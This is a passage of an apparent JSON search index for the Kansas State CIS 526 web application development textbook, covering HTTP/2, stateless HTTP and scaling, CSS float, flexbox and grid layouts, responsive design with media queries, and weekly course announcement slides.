	"content": "You may have noticed that the earlier parts of this chapter focused on HTTP version 1.1, while mentioning version 2.0. You might wonder why we didn\u0026rsquo;t instead look at version 2.0 - and it\u0026rsquo;s a valid question.\nIn short, HTTP 2.0 was created to make the request-response pattern of the web more efficient. One method it uses to do so is switching from text-based representations of requests and responses to binary-based representations. As you probably remember from working with File I/O, binary files are much smaller than the equivalent text file. The same is true of HTTP requests and responses. But the structure of HTTP 2.0 Requests and Responses are identical to HTTP 1.1 - they are simply binary (an hence, harder to read).\nBut this is not the only improvement in HTTP 2.0. Consider the request-response pattern we discussed earlier in the chapter:\nTo display a webpage, the browser must first request the page\u0026rsquo;s HTML data. As it processes the returned HTML, it will likely encounter HTML \u0026lt;img\u0026gt;, \u0026lt;link\u0026gt;, and \u0026lt;src\u0026gt; tags that refer to other resources on the server. To get these resources, it will need to make additional requests. For a modern webpage, this can add up quickly! Consider a page with 20 images, 3 CSS files, and 2 JavaScript files. That\u0026rsquo;s 25 separate requests!\nOne of the big improvements between HTTP/1.0 and HTTP/1.1 was that HTTP/1.1 does not close its connection to the server immediately - it leaves a channel open for a few seconds. This allows it to request these additional files without needing to re-open the connection between the browser and the server.\nHTTP/2.0 takes this thought a step farther, by trying to anticipate the browser\u0026rsquo;s additional requests. In the HTTP/2.0 protocol, when a browser requests an HTML page, the server can push the additional, linked files as part of the response. Thus, the entire page content can be retrieved with a single request instead of multiple, separate requests. This minimizes network traffic, allowing the server to handle more requests, and speeds up the process of rendering pages on a client\u0026rsquo;s machine.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/",
	"title": "JavaScript",
	"tags": [],
	"description": "",
	"content": "Appendix C JavaScript Bringing interaction to web pages since 1995.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/",
	"title": "Announcements",
	"tags": [],
	"description": "",
	"content": "Chapter Y Announcements Information for Current Students!\nPrevious Semesters Are Here\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/13-layouts/",
	"title": "CSS Layouts",
	"tags": [],
	"description": "",
	"content": "We often speak of the separation of concerns principle in the context of web development as setting up the roles of HTML, CSS, and JavaScript. In this understanding, HTML provides the organization of content, CSS provides for the presentation of the content, and JavaScript provides for user interaction.\nIn this understanding, CSS is often tasked with the role of laying out elements on the page. More specifically, it overrides the default flow of HTML elements (see our earlier discussion of block vs. inline elements in the HTML chapter), altering how the browser arranges elements on the page.\nThe three most common layout approaches currently used in modern web development are float, flexbox, and grid, named for the CSS properties that make them possible. You may also encounter absolutely positioned layouts and table layouts, so we will briefly discuss those as well.\nFloat Layouts By default a block-level element stretches the width of the parent element, and its siblings are pushed underneath. The CSS float property changes this behavior, allowing a block-level element to determine an appropriate width based on its content (or CSS rules), and allows sibling elements to \u0026ldquo;float\u0026rdquo; next to it. Thus, the float property has two primary values, left and right (as well as none and inherit). A float: left causes the element to float on the left side of its containing element, and a float: right floats it to the right.\nA common use is to float figures and images within a page, i.e.:\n\u0026lt;img src=\u0026#34;images/Marc-Andreessen.jpg\u0026#34;/\u0026gt; \u0026lt;p\u0026gt;People tend to think of the web as a way to get information or perhaps as a place to carry out ecommerce. But really, the web is about accessing applications. Think of each website as an application, and every single click, every single interaction with that site, is an opportunity to be on the very latest version of that application.\u0026lt;/p\u0026gt; \u0026lt;span\u0026gt;- Marc Andreessen\u0026lt;/span\u0026gt; People tend to think of the web as a way to get information or perhaps as a place to carry out ecommerce. But really, the web is about accessing applications. Think of each website as an application, and every single click, every single interaction with that site, is an opportunity to be on the very latest version of that application. - Marc Andreessen But floats can also be used to create multi-column layouts, i.e.:\n.column { float: left; box-sizing: border-box; width: 33%; height:60px; color: white; } .one {background-color: red} .two {background-color: blue; margin-left: 0.5%; margin-right: 0.5%} .three {background-color: green} \u0026lt;div class=\u0026#34;column one\u0026#34;\u0026gt; One \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;column two\u0026#34;\u0026gt; Two \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;column three\u0026#34;\u0026gt; Three \u0026lt;/div\u0026gt; One Two Three Finally, when discussing the float property, we need to discuss the clear property as well. The clear property is used to move an element below the margin area of any floating elements - basically resetting the flow of the page. It can selectively clear floating elements in the left, right, or both directions. In our column example, if we wanted to add a footer that stretched across all three columns, we\u0026rsquo;d use something like:\nfooter { clear: both; border: 1px solid black; } \u0026lt;div class=\u0026#34;column one\u0026#34;\u0026gt; One \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;column two\u0026#34;\u0026gt; Two \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;column three\u0026#34;\u0026gt; Three \u0026lt;/div\u0026gt; \u0026lt;footer\u0026gt;Footer\u0026lt;/footer\u0026gt; One Two Three Footer Flexbox Layouts The Flexible Box Layout (flexbox) is intended to offer a greater degree of control and flexibility (pun intended) to laying out web pages. Its purpose is to provide an efficient way of laying out, aligning, and distributing elements within a container. Moreover, it can carry out this goal even when the sizes of the child elements are unknown or dynamic.\nThe flexbox model therefore consists of two levels of nested elements - an outer container element and inner content item elements (the content item elements themselves can have many decendent elements). The flexbox properties help define how the content item elements are laid out within their parent container.\nAn HTML element is turned into a flexbox container by assigning it the display property of flex. Additional properties then control how the elements contained within our new flexbox container are laid out. These include:\nflex-direction determines how items are laid out, either row, column, row-reverse, or column-reverse.\nwrap-items determines if the row or column wraps into multiple rows or columns. Its values are no-wrap (default), wrap, and wrap-reverse.\njustify-content defines how content items will be aligned along the main axis of the container (horizontal for rows, and vertical for columns). Its possible values are: flex-start, flex-end, center, space-between, and space-around.\nalign-items defines how content items are aligned along the secondary axis of the container (vertically for rows, and horizontally for columns). Its possible values are flex-start (the default), flex-end, center, stretch, and baseline.\nThus, to re-create our three-column layout with flexbox, we would:\n.three-column { display: flex; flex-direction: column; justify-content: space-between; } .three-column \u0026gt; div { color: white; width: 33%; height: 60px; } \u0026lt;div class=\u0026#34;three-column\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;one\u0026#34;\u0026gt; one \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;two\u0026#34;\u0026gt; two \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;three\u0026#34;\u0026gt; three \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; One Two Three The items can also override these default behaviors with item specific CSS attributes, including allowing items to grow with flex-grow or shrink with flex-shrink to fit available space, override the default order of elements using the order attribute, or altering the alignment on a per-item basis with align-self.\nYou can also create very sophisticated layouts by nesting flex containers within flex containers. A superb reference for working with flexbox is CSS Tricks\u0026rsquo; Complete Guide to Flexbox.\nGrid Layouts While flexbox brought a lot of power to the web designer, the Grid model is an even more powerful way to lay out web elements. Unlike flex, which focuses on arranging elements along one dimension (provided you aren\u0026rsquo;t wrapping), the Grid model lays elements out in a two-dimensional grid.\nAn HTML element is turned into a grid container by assigning it the display property of grid or inline-grid. Then you define the size of the grid elements with the properties grid-template-rows and grid-template-columns. These attributes take the measurements of the columns and rows. I.e. we could recreate our three-column layout with grid-template-columns: 33% 33% 33%. But the grid is far more powerful than that. Let\u0026rsquo;s expand our three-column layout to have a separate header and footer:\ndiv#page { display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 150px auto 100px; } Here we use the unit fr for our column width, which proportions out the \u0026ldquo;free space remaining\u0026rdquo; after hard-coded measurements are accounted for. In our case, this translates into three equal-sized columns taking up all the available space.\nFor rows, our first row will be the header, and we\u0026rsquo;ve sized it to 150 pixels. The next row is our content, we\u0026rsquo;ve used the auto value to allow it to size appropriately to contain its content. The last row is the footer, and we\u0026rsquo;ve sized it to 100 pixels.\nOur HTML would look like:\n\u0026lt;div id=\u0026#34;page\u0026#34;\u0026gt; \u0026lt;header\u0026gt;\u0026lt;/header\u0026gt; \u0026lt;div id=\u0026#34;one\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;two\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;three\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;footer\u0026gt;\u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; And finally, we can assign these HTML elements to part of the grid with the grid-area property, which takes the values for row start, column start, row end, column end separated by slashes (/) to define the area of the grid they span:\nheader { grid-area: 1/1/2/4; border: 1px solid black; } #one { grid-area: 2/1/3/2; height: 50px; background-color: red; } #two { grid-area: 2/2/3/3; height: 200px; background-color: blue; } #three { grid-area: 2/3/3/4; height: 300px; background-color: green } footer { grid-area: 3/1/4/4; border: 1px solid black; } Header One Two Three Footer We\u0026rsquo;ve really only scratch the surface of what is possible with the grid. Items can be aligned and justified, and tweaked in other ways, just as with flexbox. Names can be assigned to grid rows, grid columns, and grid areas, and used to make the resulting CSS more approachable and understandable.\nA great resource for deeper exploration is CSS Trick\u0026rsquo;s Complete Guide to Grid.\nTable Layouts At one point in the 1990\u0026rsquo;s, it was common practice for graphic designers to create a web page using graphic design software, export it as an image, and then slice up the image. These pieces were then used as the background-image property of a table cell, and text was overlaid on this graphics as the contents of the cell.\nThankfully, this practice has largely been abandoned, but you may still encounter it from time to time. There are some very real problems with the approach: if you increase the text size on the page, the cells may expand beyond the size of their background image, and the seams between the images will open up. Also, if a screen reader is used, it will often read content out-of-order and will describe the portions in terms of table rows and columns.\nIn web design best practices, tables should only be used for tabular data. If you desire to use this kind of slice-and-dice approach, use the Grid instead. It provides the same control over the placement of text, and can use a single background-image on the container element or multiple background images for the items.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/13-statelessness-and-scaling/",
	"title": "Statelessness and Scaling",
	"tags": [],
	"description": "",
	"content": "One final point to make about Hyper-Text Transfer Protocol. It is a stateless protocol. What this means is that the server does not need to keep track of previous requests - each request is treated as though it was the first time a request has been made.\nThis approach is important for several reasons. One, if a server must keep track of previous requests, the amount of memory required would grow quickly, especially for popular web sites. We could very quickly grow past the memory capacity of the server hardware, causing the webserver to crash.\nA second important reason is how we scale web applications to handle more visitors. We can do vertical scaling - increasing the power of the server hardware - or horizontal scaling - adding additional servers to handle incoming requests. Not surprisingly, the second option is the most cost-effective. But for it to work, requests need to be handed quickly to the first available server - there is no room for making sure a subsequent request is routed to the same server.\nThus, HTTP was designed as a stateless protocol, in that each new HTTP request is treated as being completely independent from all previous requests from the same client. This means that when using horizontal scaling, if the first request from client BOB is processed by server NANCY, and the second request from BOB is processed by server MARGE, there is no need for MARGE to know how NANCY responded. This stateless property was critical to making the world-wide-web even possible with the earliest internet technologies.\nOf course, you probably have experience with websites that do seem to keep track of state - i.e. online stores, Canvas, etc. One of the challenges of the modern web was building state on top of a stateless protocol; we\u0026rsquo;ll discuss the strategies used to do so in later chapters.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/13-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter we have learned about several approaches to creating dynamic web servers, including server pages, custom web servers, and full stack development, often using a web development framework. We also learned how dynamic webservers can handle data and file uploads from HTML forms, as well as some security concerns involved. We also saw how state can be introduced to web apps using cookies and sessions.\nIn the next few chapters, we\u0026rsquo;ll explore these ideas in more detail.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/14-responsive-web-design/",
	"title": "Responsive Web Design",
	"tags": [],
	"description": "",
	"content": "Modern websites are displayed on a wide variety of devices, with screen sizes from 640x480 pixels (VGA resolution) to 3840x2160 pixels (4K resolution). It should be obvious therefore that one-size-fits-all approach to laying out web applications does not work well. Instead, the current best practice is a technique known as Responsive Web Design. When using this strategy your web app should automatically adjusts the layout of the page based on how large the device screen it is rendered on.\nMedia Queries At the heart of the responsive CSS approach is a CSS technique called media queries. These are implemented with a CSS media at-rule (at-rules modify the behavior of CSS, and are proceeded by an at symbol (@), hence the name). The original purpose of the media rule was to define different media types - i.e. screen and print, which would be selectively applied based on the media in play. For example, the rule:\n@media print { img { display: none; } .advertisement { display: none; } } would hide all images and elements with the advertisement class when printing a web page. You can also specify the media type with the media attribute in a \u0026lt;link\u0026gt; element, i.e. \u0026lt;link href=\u0026quot;print.css\u0026quot; rel=\u0026quot;stylsheet\u0026quot; media=\u0026quot;print\u0026quot;\u0026gt; would apply the rules from print.css only when printing the website.\nHowever, the real usefulness of the @media rule is when it is combined with a media query, which determines if its nested rules should be applied based on some aspect of the display.\nThe media query consists of:\nThe @media keyword An optional media type (typically screen, but could also be all, print, and speech) The desired media features surrounded by parentheses. Multiple features can be joined by logical operators and, or logically or-ed using a ,. More advanced queries can use not to invert an expression (if using not you must specify the media type). A block of CSS surrounded by {} An example media query that applies only when the screen is in portrait orientation (taller than it is wide) is:\n@media (orientation: portrait) { /* rules for a portrait orientation go here... */ } The most commonly used media features are max-width, min-width, max-height, min-height, and orientation. The sizes can be specified in any CSS unit of measurement, but typically px is used. The orientation can either be portrait or landscape.\nWe can also combine multiple queries into a single @media rule:\n@media (orientation: landscape) and (max-width: 700px) { /* rules for a landscape-oriented screen 700 pixels or less wide */ } The and in this case works like a logical and. You can also use the not keyword, which inverts the meaning of the query, or commas ,, which operate like a logical or.\nMore details on the use of media queries can be found in the MDN Documentation on the subject.\nBy combining the use of media queries, and CSS layout techniques, you can drastically alter the presentation of a web application for different devices. Most browser development tools will also let you preview the effect of these rules by selecting a specific device size and orientation. See the Chrome Device Mode documentation, Safari Developer Documentation, and Firefox Responsive Design Mode Documentation for details.\nThe Viewport Meta Tag The media query size features relate to the viewport, a rectangle representing the browser\u0026rsquo;s visible area. For a desktop browser, this is usually equivalent to the client area of the browser window (the area of the window excluding the borders and menu bar). For mobile devices, however, the viewport is often much bigger than the actual screen size, and then scaled to fit on the screen:\nThis strategy helps legacy websites reasonably appear on mobile devices. However, with responsive designs, we want the viewport and the device size to match exactly. We can clue mobile browsers into this desire by adding a specific meta tag to the \u0026lt;head\u0026gt; of the HTML:\n\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; For a responsive design to work, it is critical that this \u0026lt;meta\u0026gt; element be included, and use the exact syntax specified.\nAdvanced CSS Layouts Finally, responsive designs tend to make heavy use of two new CSS layout strategies - The Flexible Box Module (flex) and the CSS Grid Layout. These two layout tools allow for easily changing layouts within media queries - even allowing for the rearranging of elements!\nTwo great visual resources for learning the ins and outs of these layouts are CSS Trick\u0026rsquo;s A Complete Guide to Flexbox and A Complete Guide to Grid. In fact, you may want to bookmark these now.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/14-summary/",
	"title": "Summary",
	"tags": [],
	"description": "",
	"content": "In this chapter, we explored the Hyper-Text Transfer Protocol (HTTP), the technology used to exchange data across the web. We saw how requests and responses are simply well-structured streams of text or data exchanged across a packet-switched network. We examined the structure of these requests, and saw how they all use a similar pattern of a request or response line, a series of headers carrying metadata about the request or response, and an optional body.\nWe also discussed HTTP request methods like GET and POST, and HTTP response codes like a 404 and what these terms mean. We explored how HTTP has evolved from HTTP 1.0 to 1.1 to 2.0. And we discussed how HTTP is a stateless protocol, and how that statelessness is key to making websites that can serve thousands if not millions of users.\nWe\u0026rsquo;ll continue to reference the content of this chapter as we move forward, as HTTP is one of the core web technologies along with HTML, CSS, and JavaScript.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/",
	"title": "Summer 2021",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/01-introduction/old/",
	"title": "Previous Versions",
	"tags": [],
	"description": "",
	"content": "Previous Versions of this page:\nCourse Introduction "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/06-syllabus/old/",
	"title": "Previous Versions",
	"tags": [],
	"description": "",
	"content": "Previous Versions of this page:\nSummer 2021 Syllabus "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/",
	"title": "CIS 526 Textbook",
	"tags": [],
	"description": "",
	"content": "Web Application Development CIS 526 Course Textbook\nNathan Bean\nKansas State University\n© 2020\nThis work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/01-introduction/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": " Welcome to CIS 526\nWeb Application Development\nWelcome to CC 515\nFull Stack Web Development Russell Feldhausen Pronouns: he/him\n(785) 292-3121 (Call/Text)\n2213 Engineering Hall\n(working remotely)\nrussfeld AT ksu DOT edu\nhttps://russfeld.me - @russfeld\nEmail Preferred Communication Discord - Course Questions, Discussions, etc Email - Personal Issues, Grading Questions, To-dos, etc Email is official, Discord is more flexible Content Credits Nathan Bean - nhbean AT ksu DOT edu\nCourse Structure 8 Lab Modules 6 Milestones Gated - Must Complete in Order ==One Module Due Each Week== Can Work Ahead At Your Own Pace Complete by July 29, 2022 Module 0 - Course Introduction Navigating Canvas, Codio \u0026 YouTube Syllabus Introduce Yourself! 0 - Course Readiness Quiz Extra Credit - Bug Bounty \u0026 Helping Hands Syllabus Contract Between Teacher \u0026 Student Read Carefully Ask Questions Changes Highlighted Subject to Change Grading 15% - Activities \u0026 Quizzes 35% - Tutorials 50% - Projects Some Extra Credit Available\n(Bug Bounty) Standard 90-80-70-60 grading scale\nWhat's Different? Can Work Ahead Long Lectures Short Videos Textbooks Online Resources What's the Same? ~6 Hrs. Content per Module 1 - 6 Hrs. Lab Work per Module 6 Hrs. Content +\n6 Hrs. Lab per Week Graded by Instructor/GTA Office Hours (Virtual) Required Supplies Modern Web Browser High-Speed Internet Connection Concerns? Ask Instructor Subject to Change Image Credit: Vantaj on DeviantArt\nWhat's Next? Watch Video on Navigating Canvas Read the Syllabus Post in the Introduce Yourself! Discussion Complete the Course Readiness Quiz Read the Extra Credit Assignments \u0026#8600; Click Next! \u0026#8600; "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/03-where-to-find-help-slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rCIS 526 / CC 515\nWhere to Find Help\rAssignment Issues\rCourse Resources\rDiscord\rIt!\rEmail Instructor (Last Resort)\rCanvas Issues\rK-State IT Helpdesk - helpdesk@ksu.edu\rK-State Canvas Help\rInstructure Canvas Guides\rEmail Instructor (Last Resort)\rCodio Issues\rCodio Support\rGrading, Administrative \u0026 Interpersonal Issues\rEmail Instructor\rAcademic Advisor\rCollege/Dept. Academic Staff\rK-State Office of Student Life\rReport it: ksu.edu/report\rErrors, Omissions \u0026 Suggestions\rEmail Instructor\rExtra Credit Available!\rQuick Review\rCanvas - helpdesk@ksu.edu\rCourse - Canvas Modules \u0026 Discord\rGrading - Email Instructor\rOther - Email Instructor or Advisor\rErrors - Email Instructor\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week01/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 1 Announcements\rRussell Feldhausen\rPronouns: he/him\n(785) 292-3121 (Call/Text)\n2213 Engineering Hall\n(working remotely)\nrussfeld AT ksu DOT edu\nhttps://russfeld.me - @russfeld\nEmail Preferred\rThe Course\rGated Modules on Canvas\r1 Module Per Week\rCheck Due Dates\rMany Activities \u0026 Tutorials\r6 Milestones\rCodio\rOnline IDE\rLinux VM - root\rStandardized Environment\rTeacher Access\rGitHub Classroom\rCentralized Organization\rFeedback Pull Requests\rKeep Code Private\rCommunication\rDiscord - Course Questions, Discussions, etc\rEmail - Personal Issues, Grading Questions, To-dos, etc\rEmail is official, Discord is more flexible\rSuccess\rGrowth Mindset\rDon't just read/watch, engage\rWork Iteratively\rSave Early \u0026 Often\rAsk for Help\rProject\rCommunity Chest\r6 Milestones\rMostly Functionality\rStyle \u0026 Design Count!\rMake it your own!\rKeep in Touch!\rDiscussions on Discord\rhttps://discordbot.cs.ksu.edu\rZoom Discussions\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\rWhat's New?\r1 Module Due Every Two Weeks\rLate Work Penalty - 10% / Day\rPrototype Portion in Final Project\rMinor Changes in Each Lab\r5 Interactive Discussions\rBeta Labs\rI may develop some new labs this semester. You may opt to help \"beta test\" them for some sort of credit. More details later.\nLab Grading\rSchedule via Calendly\rCan Schedule Before Complete\rRequires 4 hours notice\rZoom with Screen Share\rCannot Change Once Started\rDiscussions\rRecorded Summer 2021\rWatch Video \u0026 Write Reaction\rQuestions? Email Instructor\rKeep in Touch!\rDiscussions on Discord\rhttps://discordbot.cs.ksu.edu\rZoom Discussions\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week02/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 2 Announcements\rThis Week\rMon: Milestone 1 Due\rFri: Week 2 Lessons\rNext Mon: Milestone 2\rMilestone Grading\rWill Grade This Week\rLook for Code Comments in GitHub\rUse Submission Comments or Release Notes\rBe patient!\rWeek 2\rAdvanced JavaScript\rJSON and AJAX\rAsynchronous JS\rWeb Workers\rNode.js\rMilestone 2\rGet Box Locations via AJAX\rProgrammatically Build Webpage\rSame Overall Design as Before\rCORS Issues\rLibraries?\rKeep in Touch!\rDiscussions on Discord\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week03/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 3 Announcements\rThis Week\rMon: Milestone 2 Due\rFri: Week 3 Lessons\rNext Mon: Milestone 3\rMilestone Grading\rWill Grade This Week\rLook for Code Comments in GitHub\rUse Submission Comments or Release Notes\rBe patient!\rWeek 3\rWeb Servers\rRequest/Response\rServing Files \u0026 Media\rRegular Expressions\rMilestone 3\rServe Static Files from Node\rHandle MIME Types\rCorrect Content Length\r404 Errors\rMilestone 1 \u0026 2\rfavicon files\rKeep in Touch!\rDiscussions on Discord\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week04/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 4 Announcements\rThis Week\rMon: Milestone 3 Due\rFri: Week 4 Lessons\rNext Tues: No Milestone\rMilestone 3 Grading\rWill Grade This Week\rLook for Code Comments in GitHub\rUse Submission Comments or Release Notes\rBe patient!\rWeek 4\rDynamic Web Servers\rECMAScript Server Pages\rFile Uploads\rSessions\rBlog Tutorial\rMilestone 4\rExpress App \u0026 Routing\rStatic Middleware\rAPI Endpoints\rSQLite Database\rDynamic Pages\rForm Submission\rKeep in Touch!\rDiscussions on Discord\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week05/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 5 Announcements\rThis Week\rFri: Week 5 Lessons\rNext Mon: Milestone 4\rWeek 5\rTemplate Rendering\rData Serialization\rDatabases\rRouting\rBlog Tutorial\rMilestone 4\rExpress App \u0026 Routing\rStatic Middleware\rAPI Endpoints\rSQLite Database\rDynamic Pages\rForm Submission\rKeep in Touch!\rDiscussions on Discord\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week06/slides/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "\rWeek 6 Announcements\rThis Week\rMon: Milestone 4\rFri: Week 6 Lessons\rNext Mon: Milestone 5\rWeek 6\rAuthentication\rAPIs\rWeb Hooks\rWeb Frameworks\rBlog Tutorial\rMilestone 5\rAdd Authentication\rUser Routes\rProtect Routes\rLink Request to User\rDB Changes\rKeep in Touch!\rDiscussions on Discord\r\"Tea Time\" Office Hours\rTuesday 3:30 | Friday 10:30\rOne-on-One Office Hours\r"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/",
	"title": "Previous Semesters",
	"tags": [],
	"description": "",
	"content": "Previous Semesters\nSummer 2021 Week 2 Milestone 4 Milestone 5 Sessions Week 7 "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]